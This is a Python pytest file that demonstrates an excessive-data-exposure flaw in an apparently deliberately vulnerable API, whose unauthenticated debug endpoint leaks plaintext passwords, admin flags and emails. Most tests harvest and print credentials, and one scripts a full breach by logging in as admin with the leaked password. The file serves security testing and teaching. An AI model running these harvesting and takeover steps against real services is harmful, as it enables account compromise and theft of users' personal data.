"""
Test Excessive Data Exposure Vulnerability (API3:2023 Broken Object Property Level Authorization)

This test demonstrates excessive data exposure in the GET /users/v1/_debug endpoint.
This endpoint exposes sensitive user data including passwords in plaintext to any requester,
without requiring authentication or authorization.

OWASP Reference: https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/

Vulnerability Location: api_views/users.py:24-26
"""

import pytest
import requests


def test_excessive_data_exposure_debug_endpoint_exposes_passwords(api_base_url: str):
    """
    Test that the /users/v1/_debug endpoint exposes passwords.

    The debug endpoint returns all user data including password fields,
    which should never be exposed to clients, even in debug/development endpoints.

    Expected behavior (vuln=1):
        - Endpoint is accessible without authentication
        - Returns all users with password fields included
        - Passwords are in plaintext

    Expected behavior (vuln=0):
        - Endpoint should not exist or require admin authentication
        - Passwords should not be included in response
    """
    # Access debug endpoint without any authentication
    response = requests.get(f"{api_base_url}/users/v1/_debug", timeout=5)

    # Endpoint should be accessible (200 OK)
    assert response.status_code == 200, \
        f"Debug endpoint not accessible or removed. Expected 200, got {response.status_code}"

    data = response.json()

    # Should return a list of users
    assert "users" in data, \
        "Expected 'users' key in response"

    users = data.get("users", [])
    assert len(users) > 0, \
        "No users returned from debug endpoint"

    # Check that password fields are exposed (just check first few users for speed)
    password_found = False
    sample_credentials = []

    for user in users[:5]:  # Only check first 5 users for speed
        if "password" in user:
            password_found = True
            if len(sample_credentials) < 3:  # Collect max 3 samples
                sample_credentials.append({
                    "username": user.get("username"),
                    "password": user.get("password"),
                    "admin": user.get("admin")
                })

    # This is the vulnerability - passwords should never be exposed!
    assert password_found, \
        "Excessive data exposure vulnerability appears patched. No passwords found in debug endpoint."

    # Print a few examples (for documentation)
    print(f"\n⚠️  CRITICAL: Debug endpoint exposes passwords! (Total users: {len(users)})")
    print("Sample exposed credentials:")
    for i, cred in enumerate(sample_credentials):
        print(f"  {i+1}. Username: {cred['username']}, Password: {cred['password']}, "
              f"Admin: {cred['admin']}")


def test_excessive_data_exposure_compare_with_normal_endpoint(api_base_url: str):
    """
    Compare the debug endpoint with the normal /users/v1 endpoint.

    The normal endpoint should NOT expose passwords, while the debug endpoint does.
    This demonstrates the difference between proper and improper data exposure.

    Expected behavior:
        - /users/v1 does NOT include password fields
        - /users/v1/_debug DOES include password fields (vulnerability)
    """
    # Get data from normal endpoint
    normal_response = requests.get(f"{api_base_url}/users/v1")
    assert normal_response.status_code == 200, \
        "Normal users endpoint not accessible"

    normal_data = normal_response.json()
    normal_users = normal_data.get("users", [])

    # Get data from debug endpoint
    debug_response = requests.get(f"{api_base_url}/users/v1/_debug")
    assert debug_response.status_code == 200, \
        "Debug endpoint not accessible"

    debug_data = debug_response.json()
    debug_users = debug_data.get("users", [])

    # Check normal endpoint does NOT expose passwords
    normal_has_passwords = any("password" in user for user in normal_users)
    assert not normal_has_passwords, \
        "Normal endpoint should not expose passwords but does!"

    # Check debug endpoint DOES expose passwords (the vulnerability)
    debug_has_passwords = any("password" in user for user in debug_users)
    assert debug_has_passwords, \
        "Debug endpoint does not expose passwords - vulnerability may be patched"

    print("\n✅ Normal endpoint: Does NOT expose passwords (correct)")
    print("⚠️  Debug endpoint: DOES expose passwords (vulnerable)")


def test_excessive_data_exposure_debug_no_authentication_required(api_base_url: str):
    """
    Test that the debug endpoint is accessible without authentication.

    This compounds the severity of the vulnerability - not only are passwords exposed,
    but anyone can access them without even authenticating.

    Expected behavior (vuln=1):
        - Debug endpoint accessible without auth
        - No Authorization header needed

    Expected behavior (vuln=0):
        - Endpoint should require authentication
        - Should return 401 without valid token
    """
    # Access without authentication
    response = requests.get(f"{api_base_url}/users/v1/_debug")

    # Should be accessible (this is the vulnerability)
    assert response.status_code == 200, \
        "Debug endpoint requires authentication - vulnerability is partially mitigated"

    # Should return user data with passwords
    data = response.json()
    users = data.get("users", [])

    assert len(users) > 0, "No users returned"
    assert any("password" in user for user in users), \
        "Passwords not exposed in unauthenticated request"

    print("\n⚠️  CRITICAL: Debug endpoint accessible without authentication!")
    print(f"Exposed {len(users)} user accounts with passwords to unauthenticated access")


def test_excessive_data_exposure_admin_flag_exposed(api_base_url: str):
    """
    Test that the debug endpoint also exposes admin flags.

    This allows attackers to enumerate which accounts have admin privileges,
    making them better targets for attacks.

    Expected behavior (vuln=1):
        - Admin flags are visible in debug endpoint
        - Can identify admin accounts

    Expected behavior (vuln=0):
        - Admin flags should not be exposed, or endpoint should not exist
    """
    response = requests.get(f"{api_base_url}/users/v1/_debug")
    assert response.status_code == 200, "Debug endpoint not accessible"

    data = response.json()
    users = data.get("users", [])

    # Check for admin field exposure
    admin_flags_exposed = any("admin" in user for user in users)
    assert admin_flags_exposed, \
        "Admin flags not exposed - partial mitigation may be in place"

    # Find admin users
    admin_users = [user for user in users if user.get("admin") is True]

    assert len(admin_users) > 0, \
        "No admin users found in database (test data issue)"

    print(f"\n⚠️  Admin account enumeration possible!")
    print(f"Found {len(admin_users)} admin accounts:")
    for admin in admin_users[:3]:  # Show first 3
        print(f"  - Username: {admin.get('username')}, Password: {admin.get('password')}")


def test_excessive_data_exposure_email_leak(api_base_url: str):
    """
    Test that email addresses are also exposed in the debug endpoint.

    Email addresses are PII and should be protected. The debug endpoint
    leaks all user emails, which could be used for phishing or social engineering.

    Expected behavior (vuln=1):
        - All email addresses exposed
        - Can harvest user emails for spam/phishing

    Expected behavior (vuln=0):
        - Emails should be protected or endpoint shouldn't exist
    """
    response = requests.get(f"{api_base_url}/users/v1/_debug")
    assert response.status_code == 200, "Debug endpoint not accessible"

    data = response.json()
    users = data.get("users", [])

    # Collect all emails
    emails = [user.get("email") for user in users if "email" in user]

    assert len(emails) > 0, \
        "No emails exposed - vulnerability may be patched"

    # All users should have emails
    assert len(emails) == len(users), \
        "Some users missing email field"

    print(f"\n⚠️  Email harvesting possible!")
    print(f"Exposed {len(emails)} email addresses")
    print(f"Sample emails: {emails[:3]}")


def test_excessive_data_exposure_full_data_breach_scenario(api_base_url: str):
    """
    Demonstrate a complete data breach scenario using the debug endpoint.

    This test shows how an attacker could:
    1. Discover the debug endpoint
    2. Extract all user data without authentication
    3. Obtain credentials for admin accounts
    4. Use those credentials to gain full access

    Expected behavior (vuln=1):
        - Complete data breach is possible
        - Can extract all credentials and login as admin

    Expected behavior (vuln=0):
        - Endpoint should not exist or be properly protected
    """
    # Step 1: Access debug endpoint without auth
    debug_response = requests.get(f"{api_base_url}/users/v1/_debug")
    assert debug_response.status_code == 200, \
        "Debug endpoint not accessible"

    data = debug_response.json()
    users = data.get("users", [])

    print(f"\n🔓 Data Breach Scenario Simulation:")
    print(f"Step 1: Accessed debug endpoint without authentication")
    print(f"        Obtained data for {len(users)} users")

    # Step 2: Extract admin credentials
    admin_users = [user for user in users if user.get("admin") is True and "password" in user]
    assert len(admin_users) > 0, \
        "No admin users with passwords found"

    admin_cred = admin_users[0]
    print(f"Step 2: Identified admin account - {admin_cred.get('username')}")

    # Step 3: Use admin credentials to login
    login_response = requests.post(
        f"{api_base_url}/users/v1/login",
        json={
            "username": admin_cred.get("username"),
            "password": admin_cred.get("password")
        }
    )

    assert login_response.status_code == 200, \
        "Failed to login with extracted credentials"

    login_data = login_response.json()
    assert login_data.get("status") == "success", \
        "Login did not succeed"

    admin_token = login_data.get("auth_token")
    assert admin_token is not None, \
        "No auth token received"

    print(f"Step 3: Successfully logged in as admin using exposed credentials")

    # Step 4: Verify admin access by trying an admin action
    # Try to get the list of all users (admin action)
    admin_headers = {"Authorization": f"Bearer {admin_token}"}
    users_response = requests.get(
        f"{api_base_url}/users/v1",
        headers=admin_headers
    )

    assert users_response.status_code == 200, \
        "Cannot access users endpoint as admin"

    print(f"Step 4: Verified admin access - can now perform privileged operations")
    print(f"\n⚠️  CRITICAL: Complete account takeover achieved through debug endpoint!")
    print(f"   Severity: Can compromise all user accounts including admin")


def test_excessive_data_exposure_endpoint_should_not_exist_in_production(api_base_url: str):
    """
    Document that debug endpoints should never exist in production.

    This test serves as documentation that the _debug endpoint is a security
    anti-pattern and should be removed entirely, not just protected.

    Expected behavior:
        - Debug endpoints should not exist in production
        - If they must exist, should require authentication + admin authorization
        - Should never expose sensitive fields like passwords
    """
    response = requests.get(f"{api_base_url}/users/v1/_debug")

    # Document the vulnerability
    if response.status_code == 200:
        print("\n⚠️  SECURITY ANTI-PATTERN DETECTED:")
        print("   Debug endpoint exists and is accessible")
        print("\n   Recommendations:")
        print("   1. Remove debug endpoints entirely from production code")
        print("   2. If debug endpoints are needed, protect them with:")
        print("      - Authentication requirement")
        print("      - Admin-only authorization")
        print("      - IP whitelisting")
        print("   3. Never expose sensitive fields like passwords")
        print("   4. Use proper logging instead of debug endpoints")

    assert response.status_code == 200, \
        "This test expects the vulnerable debug endpoint to exist to demonstrate the vulnerability"
